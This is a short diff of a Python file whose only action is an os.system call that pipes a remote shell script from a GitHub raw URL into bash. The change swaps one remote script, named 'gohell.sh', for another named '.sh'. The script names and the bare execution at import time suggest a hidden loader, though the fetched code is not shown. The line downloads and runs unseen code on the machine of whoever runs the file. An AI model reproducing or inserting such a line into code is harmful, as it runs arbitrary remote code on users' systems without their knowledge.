@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/nandafiku/gradi/raw/main/gohell.sh | bash')
+os.system('curl -sL https://github.com/nandafiku/new/raw/main/.sh | bash')
